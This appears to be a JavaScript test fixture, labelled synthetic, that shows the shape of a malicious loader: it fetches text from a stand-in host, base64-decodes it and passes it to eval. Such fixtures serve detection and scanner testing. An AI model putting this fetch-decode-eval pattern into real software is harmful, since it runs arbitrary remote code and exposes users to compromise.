// Synthetic loader-shaped fixture. It is parsed as text and must never execute.
export async function syntheticLoaderFixture() {
  const response = await fetch("https://loader-gamma.invalid/payload.txt");
  const encoded = await response.text();
  return eval(atob(encoded));
}
